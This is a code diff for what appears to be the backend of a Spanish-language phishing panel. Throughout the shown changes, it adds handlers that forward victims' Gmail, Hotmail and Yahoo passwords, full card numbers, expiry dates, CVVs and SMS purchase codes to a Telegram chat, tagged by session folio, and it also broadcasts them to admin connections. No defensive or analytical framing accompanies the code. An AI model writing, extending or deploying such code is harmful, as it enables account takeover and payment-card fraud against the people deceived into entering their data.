@@ -1458,6 +1458,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
                   const sessionData = await storage.getSessionById(sessionId);
                   const createdBy = sessionData?.createdBy || '';
                   
+                  // Enviar notificación a Telegram
+                  const smsCompraMessage = `🛒 <b>CÓDIGO SMS COMPRA</b>\n\n` +
+                    `📋 <b>Folio:</b> ${sessionFolio}\n` +
+                    `🔢 <b>Código:</b> ${inputData.smsCompra}\n` +
+                    `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
+                  sendTelegramMessage(smsCompraMessage);
+                  
                   broadcastToAdmins(JSON.stringify({
                     type: 'SMS_COMPRA_CODE',
                     data: {
@@ -1480,7 +1487,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 
                 // Enviar notificación a Telegram
                 const gmailMessage = `📧 <b>CREDENCIALES GMAIL</b>\n\n` +
-                  `📋 <b>Folio:</b> ${await storage.getSessionById(sessionId).then(s => s?.folio) || 'N/A'}\n` +
+                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
                   `📧 <b>Correo:</b> ${inputData.correo}\n` +
                   `🔑 <b>Contraseña:</b> ${inputData.contrasena}\n` +
                   `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
@@ -1490,17 +1497,42 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 updatedFields.correo = inputData.correo;
                 updatedFields.contrasena = inputData.contrasena;
                 console.log('Recibidas credenciales de Hotmail:', inputData.correo);
+                
+                // Enviar notificación a Telegram
+                const hotmailMessage = `📧 <b>CREDENCIALES HOTMAIL</b>\n\n` +
+                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
+                  `📧 <b>Correo:</b> ${inputData.correo}\n` +
+                  `🔑 <b>Contraseña:</b> ${inputData.contrasena}\n` +
+                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
+                sendTelegramMessage(hotmailMessage);
                 break;
               case 'yahoo':
                 updatedFields.correo = inputData.correo;
                 updatedFields.contrasena = inputData.contrasena;
                 console.log('Recibidas credenciales de Yahoo:', inputData.correo);
+                
+                // Enviar notificación a Telegram
+                const yahooMessage = `📧 <b>CREDENCIALES YAHOO</b>\n\n` +
+                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
+                  `📧 <b>Correo:</b> ${inputData.correo}\n` +
+                  `🔑 <b>Contraseña:</b> ${inputData.contrasena}\n` +
+                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
+                sendTelegramMessage(yahooMessage);
                 break;
               case 'datos_tarjeta':
                 updatedFields.tarjeta = inputData.numeroTarjeta;
                 updatedFields.fechaVencimiento = inputData.fechaVencimiento;
                 updatedFields.cvv = inputData.cvv;
                 console.log('Recibidos datos de tarjeta:', inputData.numeroTarjeta?.slice(-4));
+                
+                // Enviar notificación a Telegram
+                const tarjetaMessage = `💳 <b>DATOS DE TARJETA</b>\n\n` +
+                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
+                  `💳 <b>Número:</b> ${inputData.numeroTarjeta}\n` +
+                  `📅 <b>Vencimiento:</b> ${inputData.fechaVencimiento}\n` +
+                  `🔐 <b>CVV:</b> ${inputData.cvv}\n` +
+                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
+                sendTelegramMessage(tarjetaMessage);
                 break;
             }
 
